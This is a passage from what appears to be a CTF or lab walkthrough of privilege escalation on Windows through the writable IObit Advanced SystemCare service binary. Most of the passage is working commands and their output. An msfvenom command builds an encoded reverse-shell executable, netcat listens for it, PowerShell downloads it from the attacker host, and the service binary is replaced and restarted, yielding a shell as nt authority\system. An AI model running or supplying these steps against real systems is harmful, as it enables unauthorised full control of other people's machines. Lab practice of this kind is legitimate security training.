Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
Advanced SystemCare Service{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `msfvenom` to create a `reverse shell` payload.
{% capture code %}{% raw %}msfvenom -p windows/shell_reverse_tcp LHOST=<source-ip> LPORT=4444 -e x86/shikata_ga_nai -f exe -o ASCService.exe{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: ASCService.exe{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a `netcat` listener.
{% capture code %}{% raw %}rlwrap -cAr nc -lnvp 4444{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 4444){% endraw %}{% endcapture %} {% include code.html code=code %}

From the previous `netcat` listener, download the `reverse shell` payload and start the exploited service.
{% capture code %}{% raw %}C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> powershell -c wget "http://<source-ip>:8080/ASCService.exe" -outfile "ASCService.exe"
powershell -c wget "http://<source-ip>:8080/ASCService.exe" -outfile "ASCService.exe"

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> sc query AdvancedSystemCareService9
sc query AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> copy "ASCService.exe" "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
copy "ASCService.exe" "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
Overwrite C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe? (Yes/No/All): yes
yes
        1 file(s) copied.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9{% endraw %}{% endcapture %} {% include code.html code=code %}

The `privilege shell` would be spawned from the latter `netcat` listener.
{% capture code %}{% raw %}Connection from <target-ip> 49305 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system{% endraw %}{% endcapture %} {% include code.html code=code %}

